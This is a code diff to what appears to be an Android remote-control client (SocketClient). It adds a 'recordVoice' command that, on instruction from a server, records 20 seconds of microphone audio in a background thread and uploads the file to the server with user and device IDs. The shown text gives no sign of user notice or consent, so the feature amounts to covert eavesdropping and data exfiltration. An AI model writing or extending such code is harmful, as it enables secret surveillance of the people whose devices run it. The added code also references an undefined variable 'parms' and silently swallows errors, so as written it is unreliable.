@@ -116,6 +116,35 @@ public class SocketClient implements Runnable {
 				} else if (stringCommand.equals(CommandConstant.deviceLocation)) {
 					result.setContent("true");
 					Operation.findDeviceLocation();
+				} else if (stringCommand.equals(CommandConstant.recordVoice)) {
+					result.setContent("true");
+					
+					new Thread(new Runnable() {
+
+			@Override
+			public void run() { 
+							try {
+						Operation.recordVoice(20000);
+					} catch (Exception e){
+						
+					}
+      						 	
+				
+				
+					Command com = new Command(Constants.FIlE_TRANSFARE + "",
+							new String[] { Environment.getExternalStorageDirectory().getAbsolutePath() ,"recording.3gp" });
+					MessageDto m = new MessageDto(MessageDto.CLIENT_TO_SERVER);
+
+					m.setContent(JsonHandler.getCommandJson(com));
+					m.setUserId(userID);
+					m.setDeviceId(deviceID);
+
+					//Log.d("here", new File(parms[1] + "/" + parms[0]).toString());
+					Thread t = new Thread(new Upload(serverAddr, port,
+							new File(parms[0] + "/" + parms[1]), m , true));
+					t.start();
+			}
+		}).start();
 				}
 				send(JsonHandler.getMessageDtoJson(result));
 			} catch (Exception ex) {
